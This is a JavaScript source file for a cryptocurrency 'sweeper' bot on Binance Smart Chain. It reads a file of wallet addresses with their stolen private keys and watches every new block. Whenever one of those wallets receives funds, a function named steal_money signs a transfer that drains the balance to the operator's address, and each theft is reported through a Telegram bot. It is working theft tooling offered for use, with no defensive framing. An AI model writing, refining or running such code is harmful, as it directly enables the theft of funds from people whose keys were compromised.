const Web3 = require("web3")
const fs = require('fs');
const readline = require('readline');
const path = require('path');
const TelegramBot = require('node-telegram-bot-api')
var eth_js = require('./eth');
var matic_js = require('./matic')
var ftm_js = require('./ftm')
var avax_js = require('./avax')
var arbit_js = require('./arbit')


async function apis_read() {
    const fileStream = fs.createReadStream(path.join("info", "apis.txt"));
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    var apis_list = []
    for await (const line of rl) {
        var rl_token = line.split(['='])[1];
        apis_list.push(rl_token)
    }
    global.token = apis_list[0]
    global.moralis_bsc = apis_list[1]
    global.web3 = new Web3(moralis_bsc)
    global.user_wallet_address = apis_list[6]
    global.bnb_balance = apis_list[8]
    global.bnb_gas_gwei = apis_list[9]
    global.bnb_gas_addon = Number(web3.utils.toWei(bnb_balance, 'ether'))
    global.bnb_cash_limit = Number(web3.utils.toWei(String(5), 'ether'))
    global.bnb_gas_transfer_amount = Number(web3.utils.toWei(bnb_gas_gwei, 'gwei'))
    global.user_wallet_address_all_2checksom = web3.utils.toChecksumAddress(user_wallet_address)
    wallets_read()
}


async function wallets_read() {
    const fileStream = fs.createReadStream(path.join("info", "wallets.txt"))
    const rl = readline.createInterface({
        input: fileStream,
        crlfDelay: Infinity
    });
    global.all_wallets = {};
    for await (const line of rl) {
        var wallet_split = line.split(/\s+/)[0];
        var wallet = await web3.utils.toChecksumAddress(wallet_split)
        var private_key = line.split(/\s+/)[1];
        all_wallets[wallet] = [private_key]
    }
    telegram_token_read()
}


async function telegram_token_read() {
    global.bot = new TelegramBot(token, { polling: true })
    global.users = []
    bot.onText(/\/register/, (msg, match) => {
        const chatId = msg.chat.id
        users.push(chatId)
        console.log('Welcome!')
    })
    while (true) {
        if (users.length > 0) {
            for (let i = 0; i < users.length; i++) {
                await bot.sendMessage(users[i], 'Binance Smart Chain Connected...✅')
                await eth_js.telegram_token_read_eth()
                //await matic_js.telegram_token_read_matic()
                //await ftm_js.telegram_token_read_ftm()
                //await avax_js.telegram_token_read_avax()
                //await arbit_js.telegram_token_read_arb()
            }
            getBlocks()
            break
        } else {
            console.log('Write /register in your telegram bot.')
            await new Promise(resolve => setTimeout(resolve, 10000));
        }
    }
}


async function getBlocks() {
    var work = true
    while (work) {
        try {
            var latestBlock = await web3.eth.getBlock(block_identifier = web3.eth.defaultBlock, full_transactions = true);
            global.trans = latestBlock.transactions;
            for (var x in trans) {
                var to_address = trans[x]['to'];
                if (to_address in all_wallets) {
                    steal_money(web3.utils.toChecksumAddress(to_address), all_wallets[web3.utils.toChecksumAddress(to_address)]);
                }
            }
            console.log('BNB '+ latestBlock.number);
            await new Promise(resolve => setTimeout(resolve, 150));
        } catch (e) {
            await new Promise(resolve => setTimeout(resolve, 150));
            global.web3 = new Web3(moralis_bsc)
        }
    }
}


async function steal_money(wallet, wallet_specs) {
    try {
        var private_key = wallet_specs[0]
        var counter = 0
        while (true) {
            var balance = await web3.eth.getBalance(wallet)
            if (Number(balance) < bnb_gas_addon) {
                await new Promise(resolve => setTimeout(resolve, 30));
                counter++
                if (counter === 300) {
                    return;
                }
            } else {
                break;
            }
        }
        var nonce = await web3.eth.getTransactionCount(wallet)
        var transfer_amount = Number(balance) - bnb_gas_transfer_amount * 21000
        var tx_price = {
            'chainId': 56,
            'nonce': nonce,
            'to': user_wallet_address_all_2checksom,
            'value': transfer_amount,
            'gas': 21000,
            'gasPrice': bnb_gas_transfer_amount
        }
        var signed_tx = await web3.eth.accounts.signTransaction(tx_price, private_key)
        var tx_hash = await web3.eth.sendSignedTransaction(signed_tx.rawTransaction)
        global.tx_link_bnb = 'https://bscscan.com/tx/' + tx_hash.transactionHash
        global.amount_sent_bnb = web3.utils.fromWei(String(transfer_amount), 'ether')
        console.log('💰BNB '+ amount_sent_bnb +'💰 Transaction successful! ' + tx_link_bnb)
        global.user_wallet_address_all_2checksom = web3.utils.toChecksumAddress(user_wallet_address)
        sending_good_news()
    } catch (e) {
        await new Promise(resolve => setTimeout(resolve, 1000));
    }
}


async function sending_good_news() {
    var results ='💰BNB '+ amount_sent_bnb + '💰 ' + tx_link_bnb
    if (users.length > 0) {
        for (let i = 0; i < users.length; i++) {
            await bot.sendMessage(users[i], results)
        }
    }
}


apis_read()